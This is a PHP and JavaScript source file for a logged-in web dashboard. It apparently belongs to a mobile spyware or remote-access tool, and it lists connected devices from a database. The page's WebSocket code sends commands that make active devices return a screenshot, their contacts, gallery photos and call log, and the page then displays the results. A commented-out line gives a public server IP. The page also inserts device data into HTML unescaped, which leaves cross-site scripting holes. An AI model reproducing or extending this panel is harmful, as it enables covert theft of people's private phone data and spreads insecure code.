<?php
  session_start();

  if(!isset($_SESSION['user_name'])){
      header('Location: /index.php');
      exit();
  }
?>

<!DOCTYPE html>
<html>
 <head>
   <meta charset="UTF-8">
   <title><?php echo $_SESSION["user_name"]; ?>'s Home</title>
   <link rel="stylesheet" href="./bootstrap/css/bootstrap.css" >
   <link rel="stylesheet" type="text/css" href="./css/theme.css" >
   <script type="text/javascript" src="js/jquery.js"></script>
   <script type="text/javascript" src="js/websocket.js"></script>
   <script type="text/javascript" src="js/jquery.cookie.js"></script>
   <script type="text/javascript" src="js/main.js"></script>
   <script type="text/javascript" src="js/md5.js"></script>
 </head>
 <body class="main-bg">
   <div class="container">
     <div class="jumbotron" style="margin-top:40px">
       <h1>Welcome <?php echo  $_SESSION["user_name"]; ?>!</h1>
       <p>You will see the actual page when it is developed</p>
       <?php if($_SESSION["user_name"]=="super_admin"){
          echo "<a class=\"btn btn-warning\" href=\"./register.php\" >Add New User</a>";
       } ?>
       <button class="btn btn-success" onclick="logout()">Logout</button>
       <br>
       <div id="device_table"></div>
       <div id="image_display"></div>
     </div>
   </div>
   <script>
  // var conn = new WebSocket('ws://43.228.237.131:8080');
    var conn = new WebSocket('ws://localhost:8080');
   	conn.onopen = function(e) {
   	    console.log("Connection established!");
   	};

    conn.onmessage = function(e) {
      console.log(e.data);
  		var msg = JSON.parse(e.data);

      if(msg.type=="screenshot"){
        $("#image_display").html("<img src=\"data:image/png;base64,"+msg.image+"\">");
      }else if(msg.type=="contact"){
        alert("contacts are here");
        var htmlString="<table class=\"table\"><thead><tr><th>ID</th><th>Name</th><th>Phones</th></tr></thead>";
        var conts=JSON.parse(msg.list);
        $.each(conts, function(index,value) {
          htmlString+="<tr>";
          htmlString+="<td>"+value.id+"</td>";
          htmlString+="<td>"+value.name+"</td>";
          htmlString+="<td>"+value.phones+"</td>";
          htmlString+="</tr>";
         });
        htmlString+="</table>";
        $("#image_display").html(htmlString);
      }else if(msg.type=="gallery"){
        var img = JSON.parse(msg.list);

        $("#image_display").html("<img class=\"devimg\" src=\"data:image/png;base64,"+img.img1+"\"><br><hr><img class=\"devimg\" src=\"data:image/png;base64,"+img.img2+"\"><br><hr><img class=\"devimg\" src=\"data:image/png;base64,"+img.img3+"\">");
      }else if(msg.type=="calllog"){
        $("#image_display").html("<pre>"+msg.list+"</pre>");
      }
  		console.log(msg);
  	};
    
    //conn.send(JSON.stringify(msg));
    function screenshot(id){
      var msg={};
      msg.device=id;
      msg.cmd="screenshot";
      msg=JSON.stringify(msg);
      console.log("sending : "+msg);
        $("#image_display").html("<h1>Getting new Image</h1>");
      conn.send(msg);
    }

    function contacts(id){
      var msg={};
      msg.device=id;
      msg.cmd="contacts";
      msg=JSON.stringify(msg);
      console.log("sending : "+msg);
        $("#image_display").html("<h1>Getting Contacts</h1>");
      conn.send(msg);
    }

    function gallery(id){
      var msg={};
      msg.device=id;
      msg.cmd="gallery";
      msg=JSON.stringify(msg);
      console.log("sending : "+msg);
        $("#image_display").html("<h1>Getting Gallery</h1>");
      conn.send(msg);
    }
    function callLog(id){
      var msg={};
      msg.device=id;
      msg.cmd="calllog";
      msg=JSON.stringify(msg);
      console.log("sending : "+msg);
        $("#image_display").html("<h1>Getting Call Log</h1>");
      conn.send(msg);
    }

   $(document).ready(function(){
     $.getJSON("./db/get_devices.php",function(data){
       var htmlString="<table class=\"table\"><thead><tr><th>Device ID</th><th>Model</th><th>Account</th><th>Activity</th><th>Action(s)</th></tr></thead>";
       $.each(data, function(index, value) {
         htmlString+="<tr>";
         htmlString+="<td>"+value.id+"</td>";
         htmlString+="<td>"+value.name+"</td>";
         htmlString+="<td>"+value.account+"</td>";
         htmlString+="<td>";
         if(value.active==0){
           var time=parseInt(value.last_seen);
           var sec=time%60;
           htmlString+=""+Math.floor(time/60)+" m "+sec+" s ago";
         }else{
           htmlString+="active";
         }
          htmlString+="</td><td>";
          if(value.active==0){
            htmlString+="Wait till active";
          }else{
            htmlString+="<button class=\"btn btn-primary\" onclick=\"screenshot("+value.id+")\" >Screenshot</button><br>";
            htmlString+="<button class=\"btn btn-primary\" onclick=\"contacts("+value.id+")\" >Request Contacts</button><br>";
            htmlString+="<button class=\"btn btn-primary\" onclick=\"gallery("+value.id+")\" >Request Gallery</button><br>";
            htmlString+="<button class=\"btn btn-primary\" onclick=\"callLog("+value.id+")\" >Request Call Log</button><br>";
          }
          htmlString+="</td>";
         htmlString+="</tr>";
        });
       htmlString+="</table>";
       $("#device_table").html(htmlString);

     });

   });
   </script>
 </body>
</html>
